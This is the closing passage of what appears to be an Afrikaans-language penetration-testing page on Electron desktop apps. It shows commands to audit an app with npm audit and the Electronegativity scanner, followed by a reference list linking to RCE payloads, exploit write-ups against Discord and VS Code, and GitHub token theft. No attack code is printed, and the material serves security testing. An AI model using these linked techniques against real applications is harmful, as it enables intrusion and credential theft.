# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Vorige gepubliseerde adres vir bestaande boekmerke: [Electron-desktoptoepassings](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Die roete vir die hele bladsy herlei hierheen; die historiese fragment word nie onderhou nie.

## References

- [1] [Phishing en die insameling van aanmeldbewyse in Electron-toepassings](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Arbitrêre lêerlees in die Facebook Messenger Desktop App](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Misbruik van die gebrek aan konteksisolasie - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Werkswinkel oor hacking van moderne desktop-toepassings met XSS en RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - 'n saamgestelde lys bronne oor Electron.js-(on)sekuriteit](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Misbruik van Electron-API's: 'n aanvaller se eerste keuse](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE-payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE met een klik in Electron-toepassings](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Die gevare van Electron se shell.openExternal() - baie paaie na remote code execution](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Laat arbitrêre URL's toe, verwag arbitrêre kode-uitvoering](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Bereiking van RCE in 'n bekende Japannese kletsinstrument met 'n verouderde Electron-funksie](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Remote Code Execution](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Remote Code Execution in Beperkte Modus (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Diefstal van GitHub-token met een klik via VS Code Webview-sleutelbordgebeurtenisinspuiting](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code-kwessie #319593: Webviews kan arbitrêre sleutelbordkortpaaie in die hoofwerkbank aktiveer](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: bevestig die opening van notaboeke en hou op om installExtension-konteks wat deur die oproeper verskaf word, te aanvaar](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: blokkeer programmatiese heraflewering van webview-sleuteldrukke/klikke in notebook-webviews](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / plaaslike werkruimte-uitbreidings](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Hoe ek elke groot IDE in 2 weke gehack het](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Hoe om gewilde desktop-toepassings te kompromitteer terwyl nuwe aanvaloppervlakke in Electron blootgelê word](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron-sekuriteit](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Reverse Engineer Anything](https://github.com/morluto/rea)
- [24] [REA-herkonstruksie van JavaScript-artefakte](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA-werkvloeie vir JavaScript-toepassings oor verskillende lae heen](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
